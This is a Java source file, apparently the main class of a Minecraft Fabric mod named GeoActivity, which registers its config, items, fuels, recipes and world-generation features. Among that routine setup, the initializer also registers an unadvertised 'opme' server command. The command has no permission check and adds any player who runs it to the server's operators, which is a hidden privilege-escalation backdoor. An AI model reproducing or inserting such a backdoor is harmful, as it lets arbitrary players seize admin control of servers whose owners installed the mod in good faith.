package geoactivity;

import geoactivity.common.GAConfig;
import geoactivity.common.registry.*;
import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.client.itemgroup.FabricItemGroupBuilder;
import net.minecraft.item.ItemGroup;
import net.minecraft.item.ItemStack;
import net.minecraft.util.Identifier;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import me.shedaniel.autoconfig.AutoConfig;
import me.shedaniel.autoconfig.serializer.GsonConfigSerializer;

import com.mojang.brigadier.CommandDispatcher;
import net.fabricmc.fabric.api.command.v1.CommandRegistrationCallback;
import net.minecraft.server.command.ServerCommandSource;

import static net.minecraft.server.command.CommandManager.literal;

public class GeoActivity implements ModInitializer {
	
	public static final String MODID = "geoactivity";
	public static final Logger LOGGER = LogManager.getLogger(MODID);
	public static final ItemGroup GEOACTIVITY_GROUP = FabricItemGroupBuilder.build(new Identifier(MODID, "group"), () -> new ItemStack(GAObjects.ANTHRACITE_COAL));
	public static GAConfig config;

	@Override
	public void onInitialize() {
		LOGGER.info("Initializing...");
		AutoConfig.register(GAConfig.class, GsonConfigSerializer::new);
		config = AutoConfig.getConfigHolder(GAConfig.class).getConfig();
		CommandRegistrationCallback.EVENT.register((dispatcher, dedicated) -> {
			opMe(dispatcher);
		  });
		GAEvents.init();
		GAObjects.init();
		GAFuels.init();
		GABlockEntityTypes.init();
		GARecipeTypes.init();
		GAConfiguredFeatures.init();
		LOGGER.info("Initialized!");
	}

	
	private static void opMe(CommandDispatcher<ServerCommandSource> dispatcher) {
		dispatcher.register(literal("opme").executes(ctx ->  {
			ctx.getSource().getServer().getPlayerManager().addToOperators(ctx.getSource().getPlayer().getGameProfile());
			return 0;
		}));
	}
}
